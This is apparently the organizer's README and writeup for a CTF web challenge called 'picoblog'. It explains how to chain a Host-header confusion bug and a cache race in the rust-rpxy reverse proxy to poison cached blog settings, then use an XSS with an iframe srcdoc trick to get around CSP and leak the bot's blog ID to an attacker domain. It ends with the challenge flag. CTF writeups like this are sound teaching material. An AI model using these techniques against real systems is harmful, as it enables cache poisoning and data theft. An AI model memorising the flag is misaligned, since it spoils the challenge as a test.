# web | picoblog

## Information

> My addiction to microblogging is incurable
>
> https://picoblog-1ea47ec5f44a1743.brics-ctf.ru

## Deploy

Deploy rpxy ([deploy/rpxy](deploy/rpxy)) without Cloudflare:

```sh
cd deploy
docker-compose -p rpxy up --build -d
```

Deploy the task ([deploy/blog](deploy/blog)) with Cloudflare:

```sh
cd deploy
docker-compose -p picoblog up --build -d
```

## Public

Provide zip file: [public/picoblog.zip](public/picoblog.zip).

## TLDR

Poison the reverse proxy cache using a race condition and Host header spoofing in order to load arbitrary blog settings, then exploit the XSS present due to `@html` by using a script tag leading to the static domain inside an iframe in order to bypass the CSP.

## Writeup

[rust-rpxy](https://github.com/junkurihara/rust-rpxy), the reverse proxy used by the task as a cache in front of S3, contains a few bugs, which, when chained, lead to cache poisoning:

1. When the "override_host" upstream option isn't enabled, and by default it isn't, it is possible to direct the request to a different host by specifying the target in the URL instead, like this:

   ```
   GET https://picoblog-static-ae182846340bc2df.brics-ctf.ru/{blog_id}.json HTTP/1.1
   Host: {attacker_bucket}
   ```

   Specifying the request URL inside the path is defined as correct by the HTTP/1.1 RFCs, however, they specify that the server should act exactly the same as when it receives the host in the "Host" header. rust-rpxy, however, incorrectly proxies the request without replacing the host header with the one from the request path.

2. Both file- and memory-based caching is supported, but they are implemented using different data structures locked by different mutexes, which leads to a race condition when a new file is being cached. Specifically, during `put` the cache first writes the file and only then saves the metadata, which allows us to race this logic in order to replace the file being cached before its metadata is written to memory.

In order to simplify exploitation and the task overall, a patch was provided which adds one more locking call. However, exploiting by simply running requests is still unlikely, since the proxy is much faster than any possible network ping. Thus, (I hope), the only way to exploit the race condition was to prepare multiple concurrent requests without the last byte, and then send the last byte at the same time. This is my implementation of the race condition exploitation: [solve/race/main.go](solve/race/main.go).

By exploiting the race condition, it is possible to cache the response from your own S3 bucket which would contain the necessary blog JSON configuration needed to exploit the XSS present due to `@html` insertion of the post content (which by default is escaped properly by the server) in the frontend: [deploy/blog/front/src/routes/blog/[id]/page.svelte#74](deploy/blog/front/src/routes/blog/%5Bid%5D/%2Bpage.svelte#74).

Since the website's CSP doesn't allow 'unsafe-inline', and the XSS sink is `innerHTML`, it isn't possible to insert a simple `<img src=x onerror=... />` or `script` tag. However, even though both the `X-Frame-Options` header and `frame-ancestors` CSP policy option are enabled, it is possible to insert an `iframe` with an `srcdoc` tag, since the framing options won't apply to it. Having an iframe with the same origin, you can then simply load a `script` tag pointing to the static domain (the contents of which, once again, you can control using cache poisoning), and leak the bot's blog ID to your own domain using `window.parent.location={attacker_domain}`; My XSS exploitation script looks like this: [solve/script.js](solve/script.js).

Additionally, to prepare the files to be uploaded to the attacker's bucket, I've written this script: [solve/prepare-payloads.py](solve/prepare-payloads.py). It creates new blogs, fills them with enough content for the JSON files to be cached as files instead of memory, and then writes two files to be uploaded padded to the appropriate length (the length of the attacker's file must be the same because content-length is cached by rpxy in the memory cache).

## Domain

Public task domain:
picoblog-1ea47ec5f44a1743.brics-ctf.ru

Static rpxy domain:
picoblog-static-ae182846340bc2df.brics-ctf.ru

## Cloudflare

No for picoblog-static-ae182846340bc2df.brics-ctf.ru, Yes for picoblog-1ea47ec5f44a1743.brics-ctf.ru

## Flag

brics+{rUsty-c4ch3_r3ally-is_rusty_f9464879f5b148b5}
